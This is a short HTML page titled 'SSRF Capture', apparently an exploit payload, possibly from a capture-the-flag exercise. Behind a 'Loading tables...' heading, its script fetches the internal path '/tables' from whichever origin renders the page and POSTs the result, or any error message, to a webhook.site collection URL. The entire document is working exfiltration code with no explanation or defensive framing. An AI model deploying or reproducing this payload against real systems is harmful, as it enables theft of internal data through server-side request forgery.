<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SSRF Capture</title>
</head>
<body>
    <h1>Loading tables...</h1>
    <script>
        fetch('/tables')
            .then(response => response.text())
            .then(data => {
                fetch('https://webhook.site/547f93ad-ea8e-40ea-bd32-e986fa242f84', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                    body: 'tables=' + encodeURIComponent(data)
                });
            })
            .catch(err => {
                // Send the error to Webhook.site for debugging
                fetch('https://webhook.site/547f93ad-ea8e-40ea-bd32-e986fa242f84', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                    body: 'error=' + encodeURIComponent(err.message)
                });
            });
    </script>
</body>
</html>
